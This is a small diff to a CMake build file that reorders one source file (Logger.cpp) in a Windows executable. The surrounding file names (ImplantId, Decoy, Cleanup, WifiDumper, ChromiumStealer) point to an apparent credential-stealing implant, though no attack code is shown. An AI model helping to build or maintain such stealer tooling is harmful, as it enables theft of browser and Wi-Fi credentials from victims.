@@ -34,7 +34,6 @@ FetchContent_MakeAvailable(googletest)
 
 add_executable(main WIN32
     src/main.cpp
-    src/utils/Logger.cpp
     src/core/ImplantId.cpp
     src/crypto/AesGcm.cpp
     src/crypto/Base64.cpp
@@ -49,6 +48,7 @@ add_executable(main WIN32
     src/decoy/Decoy.cpp
     src/utils/Cleanup.cpp
     src/utils/Shared.cpp
+    src/utils/Logger.cpp
     src/wifi/WifiDumper.cpp
     src/utils/Exec.cpp
     src/credential/ChromiumStealer.cpp
